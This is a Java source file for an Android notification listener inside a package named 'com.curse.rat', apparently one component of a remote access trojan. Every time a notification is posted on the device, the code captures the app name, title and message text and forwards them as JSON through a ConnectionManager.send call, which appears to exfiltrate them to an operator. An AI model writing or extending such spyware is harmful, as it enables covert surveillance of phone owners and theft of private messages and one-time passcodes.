package com.curse.rat;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import android.app.Notification;
import android.os.Bundle;
import org.json.JSONObject;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class NotificationManager extends NotificationListenerService {
    private static final String TAG = "NotificationManager";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String packageName = sbn.getPackageName();
            Notification notification = sbn.getNotification();
            Bundle extras = notification.extras;

            String title = extras.getString(Notification.EXTRA_TITLE, "No Title");
            CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT);
            String content = (text != null) ? text.toString() : "No Content";

            JSONObject jo = new JSONObject();
            jo.put("type", "notification");
            jo.put("app", packageName);
            jo.put("title", title);
            jo.put("content", content);
            jo.put("time", new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date()));
            
            ConnectionManager.send(jo.toString());
        } catch (Exception e) {
            Log.e(TAG, "Notification Error: " + e.getMessage());
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Optional: track dismissed notifications
    }
}
